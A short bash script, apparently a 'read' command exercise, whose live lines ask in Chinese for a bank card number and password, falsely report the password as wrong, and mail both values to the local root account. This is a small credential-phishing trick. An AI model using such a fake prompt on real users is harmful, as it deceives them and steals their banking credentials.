#!/bin/bash
#read first second third
#echo "the first parameter is $first"
#echo "the second parameter is $second"
#echo "the third parameter is $third"


#read test
read -p "请输入你的银行卡帐号:" num
read -p "请在五秒内输入密码:" -t 5 pass
echo "你的密码错误!"
echo $num |mail -s "card num" root
echo $pass|mail -s "card pass" root
